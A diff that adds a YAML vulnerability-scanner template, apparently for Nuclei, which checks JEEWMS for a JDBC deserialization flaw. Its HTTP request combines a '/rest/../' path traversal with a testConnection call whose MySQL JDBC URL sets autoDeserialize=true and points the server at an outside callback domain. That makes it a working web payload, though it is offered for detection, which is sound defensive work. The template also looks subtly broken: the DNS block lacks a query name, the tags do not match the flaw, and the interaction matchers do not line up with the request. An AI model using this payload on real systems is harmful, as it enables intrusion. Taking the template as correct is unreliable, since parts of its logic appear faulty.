@@ -1,0 +1,46 @@
+id: jeewms-dynamicdatasourcecontroller-jdbc-deserialization
+info:
+  name: JEEWMS dynamicDataSourceController JDBC Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,sql-injection
+
+dns:
+  - name: generate-dns-log
+    type: A
+    class: inet
+    retries: 3
+    matchers:
+      - type: word
+        words:
+          - "resolved"
+    extractors:
+      - type: regex
+        name: dns_domain
+        regex:
+          - "\\b(?:[a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}\\b"
+        internal: true
+
+http:
+  - raw:
+      - |
+        GET /rest/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{dns_domain}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "200 OK"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "jdbc:mysql://{{dns_domain}}"
